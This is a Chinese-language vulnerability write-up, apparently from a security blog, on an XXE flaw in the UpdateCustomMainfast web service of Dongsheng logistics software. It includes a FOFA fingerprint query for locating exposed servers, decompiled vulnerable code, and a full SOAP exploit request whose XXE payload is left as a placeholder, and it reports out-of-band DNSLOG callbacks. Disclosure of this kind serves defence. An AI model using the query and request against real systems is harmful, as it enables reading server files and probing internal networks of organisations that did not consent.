---
title: "东胜物流软件 UpdateCustomMainfast XXE漏洞"
source: https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html
asset_dir: embedded-base64
---

# 漏洞简介

东胜物流[软件](#)是一款广泛应用于物流行业的信息管理系统，主要用于货物运输、仓储管理以及供应链协同等场景，帮助企业实现物流业务的高效运作。该软件的 `UpdateCustomMainfast` 接口存在 XML 外部实体注入（[XXE](https://mrxn.net/tag/XXE "XXE")）[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，攻击者可以通过构造恶意的 XML 输入[数据](#)，触发该接口解析外部实体，从而读取服务器上的敏感文件或发起内部网络请求。成功利用该漏洞可能导致敏感信息泄露、系统配置暴露，甚至在特定环境下实现进一步的权限提升或系统控制，严重威胁企业数据安全和业务连续性。

运输和物流

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

直接看 `UpdateCustomMainfast` 的实现逻辑

```
  public string UpdateCustomMainfast(
    string Xdoc,
    string XdocAfter,
    string Corpid,
    string SenderOp,
    string SenderHandphone,
    string SenderEmail,
    string SenderFax,
    string Mblno)
  {
    try
    {
      bool AfterDoc = false;
      string filename = Mblno;
      string str1 = filename + "_";
      string str2 = $"d:\\Manifest\\Sendmain\\{filename}.xml";
      string str3 = $"d:\\Manifest\\Sendmain\\{filename}.zip";
      string str4 = $"d:\\Manifest\\Sendafter\\{str1}.xml";
      string str5 = $"d:\\Manifest\\Sendafter\\{str1}.zip";
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.LoadXml(Xdoc);
```

深入探索

data

数据管理

字典与百科全书

参数 `Xdoc` 无任何过滤或校验，直接使用 `XmlDocument` 进行解析，造成[XXE](https://mrxn.net/tag/XXE "XXE")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，朴实无华。

软件

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:UpdateCustomMainfast>
         <!--Optional:-->
         <dsw:Xdoc>XXEPOC</dsw:Xdoc>
         <!--Optional:-->
         <dsw:XdocAfter>1</dsw:XdocAfter>
         <!--Optional:-->
         <dsw:Corpid>1</dsw:Corpid>
         <!--Optional:-->
         <dsw:SenderOp>1</dsw:SenderOp>
         <!--Optional:-->
         <dsw:SenderHandphone>1</dsw:SenderHandphone>
         <!--Optional:-->
         <dsw:SenderEmail>1</dsw:SenderEmail>
         <!--Optional:-->
         <dsw:SenderFax>1</dsw:SenderFax>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
      </dsw:UpdateCustomMainfast>
   </soap:Body>
</soap:Envelope>
```

![东胜物流软件 UpdateCustomMainfast XXE漏洞](data:image/webp;base64,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)

成功在DNSLOG平台收到DNS和HTTP请求。

编程
